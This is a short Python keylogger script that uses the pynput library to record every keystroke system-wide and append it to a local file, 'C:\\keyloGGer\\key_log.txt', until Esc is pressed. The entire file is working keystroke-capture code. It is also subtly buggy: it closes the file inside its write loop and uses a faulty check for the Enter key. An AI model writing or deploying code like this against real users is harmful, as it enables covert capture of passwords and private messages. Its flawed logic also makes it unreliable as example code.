# --- IMPORT MODULES
from pynput.keyboard import Key, Listener



# --- FILES
keys_information = "key_log.txt"



# --- GLOBAL VARIABLES
path = "C:\\keyloGGer"  # Path of the file where everything is to be saved
extend = "\\"
number_of_iterations_end = 3



# --- LOGGING KEYS
number_of_iterations = 0
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(' ')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
                elif k.find("enter"):
                    f.write('\n')
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

'''
TEST ALL:


'''
